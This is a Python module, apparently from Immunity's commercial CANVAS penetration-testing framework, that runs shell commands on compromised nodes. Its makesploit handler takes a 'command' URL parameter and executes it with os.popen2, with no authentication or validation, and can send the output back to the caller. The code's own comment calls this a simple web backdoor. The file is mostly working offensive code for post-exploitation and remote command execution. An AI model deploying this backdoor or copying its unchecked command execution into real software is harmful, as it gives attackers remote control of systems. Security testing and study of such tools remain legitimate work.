#! /usr/bin/env python

"""
Runcommand is used on remote nodes or can be used from
HTTPSERVER as a tester for CommandLineExecuter class

"""
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import os
import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from ExploitTypes.localcommand import LocalCommand

NAME                = "runcommand"
DESCRIPTION         = "Calls popen2() or equivalent. Uses first selected node."
DOCUMENTATION       = {}
VERSION             = "1.0"

PROPERTY            = {}
PROPERTY['TYPE']    = "Commands"
PROPERTY['SITE']    = "Local"
PROPERTY['ARCH']    = [ ["Unix", "All"], ["Windows"] ]


from httpclientside import httpclientside

class theexploit(LocalCommand, httpclientside):
    def __init__(self):
        LocalCommand.__init__(self)
        httpclientside.__init__(self)
        self.datatype   = "text/html" #for HTTPSERVER version
        self.result     = ""
        self.name       = NAME
        self.command    = "echo hi"
        self.blind      = True
        return

    def gui_update( self ):
        test = [( "commandentry", "netstat -an" )]
        return test

    def makesploit(self,clientheader,clientbody):
        """
        For use by exploits/httpserver/httpserver.py -O singleexploit:runcommand -O blind:1

        This is useful as a simple www backdoor (probably not used)
        but more likely used for demonstrating and testing
        our CommandLineExecuter abilities.
        """
        from libs.spkproxy import header, body
        import urllib
        h           = header("SERVER")
        b           = body()
        user_agent  = clientheader.getStrValue(["User-Agent"])
        self.log("User agent of connecting host: %s" % user_agent)
        clientheader.normalize()
        command = urllib.unquote_plus(clientheader.URLargsDict.get("command",""))
        self.log("URLArgs: %s"%clientheader.URLargsDict)
        self.log("Executing command: %s" % command)
        result = os.popen2(command)[1].read()
        if self.blind:
            self.log("Blind, so just returning ok")
            sploitstring = "ok"
        else:
            self.log("Non-blind, getting result")
            sploitstring = result
        self.log("Sending %d bytes" % len(sploitstring))
        h.addHeader("Content-type",self.datatype)
        h.addHeader("Connection","close")
        b.setBody(sploitstring)
        return h,b

    def getargs(self):
        self.command    = self.argsDict.get("command", self.command)
        self.blind      = self.argsDict.get("blind", self.blind)
        return

    def run(self):
        self.setInfo("%s (in progress)" % (NAME))
        self.getargs()
        node = self.argsDict["passednodes"][0]
        self.log("Running command: %s" % self.command)
        node = self.argsDict["passednodes"][0]
        if hasattr(node, 'runcommand'):
            if 'android' in node.capabilities:
                self.command = "PATH=$PATH:/system/bin; " + self.command
            self.result = node.runcommand(self.command)
            devlog("runcommand", "type of result: %s"%type(self.result))
        else:
            self.log("Cannot run commands on this node")
            return 0
        self.log("Command output for: %s" % self.command)
        self.log("%s" % self.result)

        self.dispshellcmd = self.command
        self.setInfo("%s - \"%s\" (finished)" % (NAME,self.command))
        return 1
